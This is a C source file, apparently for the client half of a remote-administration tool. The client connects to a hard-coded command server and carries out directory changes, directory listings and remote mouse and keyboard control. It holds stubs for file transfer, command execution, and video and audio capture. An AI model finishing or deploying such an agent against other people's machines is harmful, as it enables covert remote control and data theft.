#include "general.h"
#include "files.h"
#include "utils.h"
#include "inputs.h"
#include "video.h"

/*
Parses and executes commands sent by server
Returns 0 to keep program alive, anything else otherwise
Assumes 'buffer' contains only one command
TODO - add resiliance for 'buffer' containing more than one command?
*/
int commandHandler(char* buffer, int len, SOCKET *mainSock) {
	// get the command
	char cmd = buffer[0];
	// check which command was called
	if (cmd == CHANGE_DIR) {
		shiftStringLeft(buffer, len, 1);
		changeDirectory(buffer, mainSock);
	} else if (cmd == LIST_DIR) {
		listDirectoryContents(mainSock);
	} else if (cmd == DOWNLOAD) {
		printf("TODO - ADD DOWNLOAD FEATURE\n");
	} else if (cmd == UPLOAD) {
		printf("TODO - ADD UPLOAD FEATURE\n");
	} else if (cmd == RUN_CMD) {
		printf("TODO - ADD EXEC FEATURE\n");
	} else if (cmd == START_VIDEO) {
		printf("TODO - REFACTOR VIDEO CODE\n");
	} else if (cmd == END_VIDEO) {
		printf("TODO - REFACTOR VIDEO CODE\n");
	} else if (cmd == START_MOUSE) {
		toggleMouseControl(1);
	} else if (cmd == END_MOUSE) {
		toggleMouseControl(0);
	} else if (cmd == START_AUDIO) {
		printf("TODO - ADD AUDIO FEATURE\n");
	} else if (cmd == END_AUDIO) {
		printf("TODO - ADD AUDIO FEATURE\n");
	} else if (cmd == START_KEYS) {
		toggleKeyboardControl(1);
	} else if (cmd == END_KEYS) {
		toggleKeyboardControl(0);
	} else if (cmd == KILL_PROC) {
		return 1;
	} else {
		printf("Unknown command received: %d\n", cmd);
	}
	return 0;
}

/*
Receive input from the command server
Passes the input to the command handler
*/
void commandReceiveLoop(SOCKET *mainSock) {
	int retCode;
	char buffer[4096];

	do {
		// get the next command and check for connection errors
		ZeroMemory(buffer, 4096);
		retCode = recv(*mainSock, buffer, 4096, 0);
		if (retCode == 0) {
			printf("Connection closed...\nShutting down...\n");
			return;
		} else if (retCode < 0) {
			printf("Recv failed with error: %d\n", WSAGetLastError());
			printf("Shutting down...\n");
			return;
		}
		// handle the command
		retCode = commandHandler(buffer, retCode, mainSock);
	} while (retCode == 0);
}

/*
Initialize WSA, get the launch directory, and connect to the command server
Once a connection is established, enter the command receive loop
*/
int main(int argc, char* argv[]) {
	// initialize the WSA stuff
	WSADATA wsa;
	int retCode = WSAStartup(MAKEWORD(2, 2), &wsa);
	if(retCode != 0) {
		printf("WSAStartup failed with error: %d\nShutting down...\n", retCode);
		return 1;
	}
	// get the launch directory
	getLaunchDirectory();
	printf("Running from \"%s\"\n", getCurrentDirectory());
	// connect to the command server
	SOCKET mainSock = NULL;
	retCode = connectToTCP(SERVER_ADDR, SERVER_CMD_PORT, &mainSock);
	if (retCode != 0) {
		printf("Failed to connect to command server!\nShutting down...\n");
		return 1;
	}
	// receive commands until connection is terminated
	commandReceiveLoop(&mainSock);
	// end main
	return 0;
}